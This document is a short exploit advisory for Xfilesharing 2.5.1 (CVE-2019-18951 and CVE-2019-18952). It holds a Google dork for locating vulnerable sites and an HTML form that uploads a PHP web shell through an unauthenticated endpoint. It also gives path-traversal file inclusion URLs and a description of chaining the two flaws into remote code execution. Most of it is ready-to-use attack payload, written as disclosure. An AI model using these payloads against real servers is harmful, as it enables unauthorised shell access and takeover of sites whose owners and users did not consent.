@@ -1,0 +1,34 @@
+# Exploit Title: Xfilesharing 2.5.1 - Arbitrary File Upload
+# Google Dork: inurl:/?op=registration
+# Date: 2019-11-4
+# Exploit Author: Noman Riffat
+# Vendor Homepage: https://sibsoft.net/xfilesharing.html
+# Version: <=2.5.1
+# CVE : CVE-2019-18951, CVE-2019-18952
+
+#####################
+Arbitrary File Upload
+#####################
+
+<form action="http://xyz.com/cgi-bin/up.cgi" method="post" enctype="multipart/form-data">
+    <input type="text" name="sid" value="joe">
+    <input type="file" name="file">
+    <input type="submit" value="Upload" name="submit">
+</form>
+
+Shell : http://xyz.com/cgi-bin/temp/joe/shell.php
+
+####################
+Local File Inclusion
+####################
+
+http://xyz.com/?op=page&tmpl=../../admin_settings
+
+This URL will fetch "admin_settings.html" template without any authentication. The ".html" extension is hard coded on the server so the included file must be with html extension anywhere on the server. You can even merge LFI with Arbitrary File Upload vulnerability by uploading an html file i.e. "upload.html" and changing the "sid" to "../../../../../../tmp" and so the file gets uploaded in tmp directory of the server. Now you can include the file like following.
+
+http://xyz.com/?op=page&tmpl=../../../../../../../tmp/upload
+
+The Xfilesharing script has builtin shortcodes as well so you can achieve RCE by including them in that "upload.html" file.
+
+Noman Riffat, National Security Services Group Oman
+@nomanriffat, @nssgoman
